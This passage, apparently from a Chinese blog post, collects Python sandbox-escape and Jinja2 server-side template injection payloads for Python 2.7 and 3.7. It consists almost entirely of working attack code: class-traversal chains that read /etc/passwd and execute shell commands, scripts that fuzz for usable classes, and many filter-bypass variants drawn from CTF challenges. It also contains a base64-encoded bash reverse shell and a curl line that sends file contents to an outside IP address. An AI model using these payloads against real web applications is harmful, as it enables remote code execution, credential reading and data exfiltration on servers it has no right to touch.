&#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;urlparse.ResultMixin&#39;&gt;, &lt;type &#39;collections.deque&#39;&gt;, &lt;type &#39;deque_iterator&#39;&gt;, &lt;type &#39;deque_reverse_iterator&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;itertools.combinations&#39;&gt;, &lt;type &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;type &#39;itertools.cycle&#39;&gt;, &lt;type &#39;itertools.dropwhile&#39;&gt;, &lt;type &#39;itertools.takewhile&#39;&gt;, &lt;type &#39;itertools.islice&#39;&gt;, &lt;type &#39;itertools.starmap&#39;&gt;, &lt;type &#39;itertools.imap&#39;&gt;, &lt;type &#39;itertools.chain&#39;&gt;, &lt;type &#39;itertools.compress&#39;&gt;, &lt;type &#39;itertools.ifilter&#39;&gt;, &lt;type &#39;itertools.ifilterfalse&#39;&gt;, &lt;type &#39;itertools.count&#39;&gt;, &lt;type &#39;itertools.izip&#39;&gt;, &lt;type &#39;itertools.izip_longest&#39;&gt;, &lt;type &#39;itertools.permutations&#39;&gt;, &lt;type &#39;itertools.product&#39;&gt;, &lt;type &#39;itertools.repeat&#39;&gt;, &lt;type &#39;itertools.groupby&#39;&gt;, &lt;type &#39;itertools.tee_dataobject&#39;&gt;, &lt;type &#39;itertools.tee&#39;&gt;, &lt;type &#39;itertools._grouper&#39;&gt;, &lt;type &#39;_thread._localdummy&#39;&gt;, &lt;type &#39;thread._local&#39;&gt;, &lt;type &#39;thread.lock&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;type &#39;_io._IOBase&#39;&gt;, &lt;type &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;type &#39;_hashlib.HASH&#39;&gt;, &lt;type &#39;_random.Random&#39;&gt;, &lt;type &#39;cStringIO.StringO&#39;&gt;, &lt;type &#39;cStringIO.StringI&#39;&gt;, &lt;type &#39;time.struct_time&#39;&gt;] 4、文件读取 Payload 1 发现40的地方存在 &lt;type &#39;file&#39;&gt; 12&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()request.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 查下标 1[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&#39;file&#39;) 1234567#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[2].__subclasses__(): print num print item num+=1 Payload 2 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 5、命令执行 寻找包含os模块的脚本 1234567891011#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[-1].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 得到 12345671 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt; 前面已经找到了包含os模块的类，先初始化，再引用即可 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) 只不过命令执行没有回显，需要反弹shell或者利用curl带出 反弹shell 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;) curl带出 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;117.78.1.204&#x2F;?data&#x3D;$data;&#39;) catch_warnings也可以进一步构造来执行命令 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 先介绍两个属性，已知函数名可获取函数信息 1234567891011def fun(x&#x3D;1): # nothing here a&#x3D;x*2 flag&#x3D;&#39;neko&#39; return aprint fun.func_code.co_constsprint fun.func_globals&#x3D;&gt;(None, 2, &#39;neko&#39;)&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125; 可构造 1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) 还有几种变形 1234567891011__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125; Python3Python 3.7.5 1、获取类对象 123456&gt;&gt;&gt; &#39;&#39;.__class__&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; [].__class__&lt;class &#39;list&#39;&gt; 2、寻找基类object 1234567&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;class &#39;object&#39;&gt; 3、寻找可用的引用 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;] 4、文件读取/命令执行 3个本地测试成功的payload 123().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;) 12345693&lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;127&lt;class &#39;os._wrap_close&#39;&gt;-1&lt;class &#39;rlcompleter.Completer&#39;&gt; 通过观察，其实就是__global__中存在sys或者system或者__builtins__模块 FUZZ脚本 1234567891011121314#!/usr/bin/env python# encoding: utf-8for item in ().__class__.__bases__[0].__subclasses__(): try: if 'system' in item.__init__.__globals__: print('system',num,item) if 'sys' in item.__init__.__globals__: print('sys',num,item) if '__builtins__' in item.__init__.__globals__: print('__builtins__',num,item) num+=1 except: print '-' num+=1 fuzz出很多其他的，测试一下 尝试自己构造for循环 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &#39;sys&#39; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 一个0代表执行一次🤦‍♂️，命令执行的结果无法回显，利用curl带出 当然也可以指定模块名，就可以只执行一次，比如前面FUZZ出来的 1sys 128 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; 注意是后半部分Quitter 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 上面三个模块中__builtins__最为丰富 12345[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() 比如还有chr()函数 Jinja2的for循环处理 123&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; eval执行的好处是直接有回显， Some Tricks（测试环境为Py2）.被过滤 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;) 使用getattr() 123456[].__class__ &#x3D;&gt; getattr([],&#39;__class__&#39;)[].__class__.__base__ &#x3D;&gt; getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)[].__class__.__base__.__subclasses__()[59] &#x3D;&gt; getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59][].__class__.__base__.__subclasses__()[59].__init__ &#x3D;&gt; getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)...getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) _被过滤 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) 中括号被过滤 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 可以用getitem和pop进行绕过过滤 1&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 引号被过滤 先获取chr()再将文件名拼接 1&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 过滤双括号)) 利用文件盲注 1&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125; 写个脚本即可 总结通用的payload 基类 12&#39;&#39;.__class__.__mro__[-1]().__class__.__base__ Python 2.7 &lt;type &#39;file&#39;&gt; 下标一般是40，如果不行的话也可爆破试试 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() os、__builtins__、linecache模块 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['os', '__builtins__', 'linecache']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) 这里有很多变形可以参考上面的 jinja2的for循环一把梭 12345&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Python 3.7 sys、system、__builtins__模块，其中__builtins__和python2的略有不同 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['sys', '__builtins__', 'system']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) jinja2的for循环一把梭 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ======================分割线 安恒杯抗疫月赛 没打比赛，似乎是过滤了.和_， 我想到的payload 1getattr(getattr(getattr(getattr(getattr(&#39;&#39;,dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;mro&#39;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;system&#39;](&#39;ls&#39;) 赛后看到下面两个payload payload1，利用16进制编码 1&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[30][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125; payload2，利用request 1&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read() 这里突然意识到文章前面都没有提到过滤器，而在模版引擎中过滤器也有很多szs 12345#比如flag被过滤，|reverse&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()#比如getattr被过滤，|attr(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#names|last，取序列最后一个元素等等 =======================分割线 有时候后端代码过滤代码可能是这样的 open (&#39;&#39;) =======================分割线 又逛到一篇bypass的文章 从SSTI到沙箱逃逸-jinja2 需要获取的内容在 config 中，不能使用(、)、self、config 可用的上下文变量/函数如下url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config 同时利用上下文获取 config 方式如下 1__globals__[&#39;current_app&#39;].config&#96; &#x2F; &#96;top.app.config 12url_for.__globals__[&#39;current_app&#39;].configget_flashed_messages.__globals__[&#39;current_app&#39;].config ============================分割线 参考链接： http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/ 